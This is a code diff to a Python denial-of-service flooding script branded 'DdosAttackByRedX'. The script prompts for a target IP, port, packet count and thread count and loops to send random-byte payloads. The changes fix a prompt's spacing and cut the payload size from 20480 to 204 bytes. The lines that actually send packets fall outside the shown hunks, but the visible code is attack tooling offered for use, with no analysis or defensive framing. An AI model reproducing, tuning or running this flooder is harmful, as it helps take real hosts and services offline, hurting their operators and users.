@@ -29,10 +29,10 @@ print("------------------------------------------------------------")
 ip = str(input("DdosAttackByRedX | ip:"))
 port = int(input("DdosAttackByRedX | port:"))
 choice = str(input("DdosAttackByRedX | Serang Ga Ni?(y/n):"))
-times = int(input("DdosAttackByRedX| Packets:"))
+times = int(input("DdosAttackByRedX | Packets:"))
 threads = int(input("DdosAttackByRedX | Threads:"))
 def run():
-    data = random._urandom(20480)
+    data = random._urandom(204)
     i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
@@ -45,7 +45,7 @@ def run():
            print(" [!] RedX IS HERE DUDE! ")
 
 def run2():
-    data = random._urandom(20480)
+    data = random._urandom(204)
     i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
